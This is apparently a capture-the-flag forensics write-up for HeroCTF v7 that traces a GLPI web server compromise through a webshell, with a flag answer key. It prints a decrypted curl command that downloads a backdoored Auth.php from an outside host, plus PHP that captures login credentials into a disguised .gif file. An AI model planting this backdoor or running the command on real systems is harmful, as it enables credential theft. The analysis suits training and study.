# Operation Pensieve Breach 2 - HeroCTF v7

## Challenge Description
- Director of Hogwarts (Albus Dumbledore) got his account compromised
- Last legitimate login was from 192.168.56.230 (pensive.hogwarts.local)
- Need to find:
  1. Absolute path of file that led to compromise
  2. Absolute path of file used to retrieve Albus' account
  3. Value of 2nd field of 2nd piece of information in file #2

## Attack Chain

### Step 1: Initial Access
- Attacker IP: `192.168.56.200` using `python-requests/2.32.5`
- Used compromised `neville.longbottom` LDAP account (from Part 1)

### Step 2: Webshell Upload
- Uploaded webshell via GLPI file upload vulnerability
- Location: `/var/www/glpi/files/_tmp/setup.php`
- Webshell capabilities: dump passwords, execute encrypted commands

### Step 3: Backdoor Installation
Commands executed via webshell (from Apache access logs at `/var/log/apache2/glpi_ssl_access.log`):

| Encrypted Command | Decrypted |
|-------------------|-----------|
| `oGAHt/Kk1OKeXWxy7iXUfw==` | (garbage/failed) |
| `4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=` | `curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php` |
| `86AyGErKuj5UoZE9eHtlIg==` | `whoami` |

Webshell command decryption key (from setup.php):
- Key: `14ac4b90bd3f880e741a85b0c6254d1f`
- IV: `5cf025270d8f74c9`
- Algorithm: AES-256-CBC

### Step 4: Credential Capture Backdoor
The backdoored `/var/www/glpi/src/Auth.php` contains credential capture code (lines 964-975):
```php
$key = "ec6c34408ae2523fe664bd1ccedc9c28";
$iv  = "ecb2b0364290d1df";

$data = json_encode([
    'login' => $login_name,
    'password' => $login_password,
]);

$encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
$encoded = base64_encode($encrypted) . ";";

$file = "/var/www/glpi/pics/screenshots/example.gif";
file_put_contents($file, $encoded, FILE_APPEND);
```

### Step 5: Credentials Captured
File `/var/www/glpi/pics/screenshots/example.gif` contains two captured credentials:
```
mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K;U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==;
```

Decrypted (using key/iv from Auth.php backdoor):
- **Piece 1**: `{"login": "Flag", "password": "Hero{FakeFlag:("}`
- **Piece 2**: `{"login": "albus.dumbledore", "password": "FawkesPhoenix#9!"}`

## Solution

| Question | Answer |
|----------|--------|
| File that led to compromise | `/var/www/glpi/src/Auth.php` (backdoored auth file that captured credentials) |
| File used to retrieve Albus' account | `/var/www/glpi/pics/screenshots/example.gif` (where captured creds are stored) |
| 2nd field of 2nd piece | `FawkesPhoenix#9!` (password field of albus.dumbledore entry) |

**Key insight**: The webshell (`setup.php`) was just a tool - the actual file that "led to the compromise" was the backdoored `Auth.php` which intercepted Albus' credentials when he logged in.

## Flag
```
Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
```
